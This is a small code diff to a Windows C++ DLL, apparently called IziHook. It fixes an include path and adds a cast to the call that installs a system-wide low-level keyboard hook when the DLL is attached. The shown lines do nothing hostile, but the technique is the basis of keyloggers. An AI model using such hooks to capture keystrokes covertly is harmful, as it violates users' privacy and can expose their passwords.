@@ -15,7 +15,7 @@
 #include <fstream>
 
 
-#include "dll/IziHook.hh"
+#include "IziHook.hh"
 
 #pragma comment(lib, "user32.lib")
 
@@ -110,7 +110,7 @@ int APIENTRY DllMain(HINSTANCE hInstance, DWORD fdwReason, PVOID pvReserved) {
 int installThread()
 {
 	std::cout << "Processe attached" << std::endl;
-	hook = SetWindowsHookEx(WH_KEYBOARD_LL, kbproc, NULL, 0);
+	hook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)kbproc, NULL, 0);
 	if (hook == NULL)
 		return (-1);
 	MSG msg;
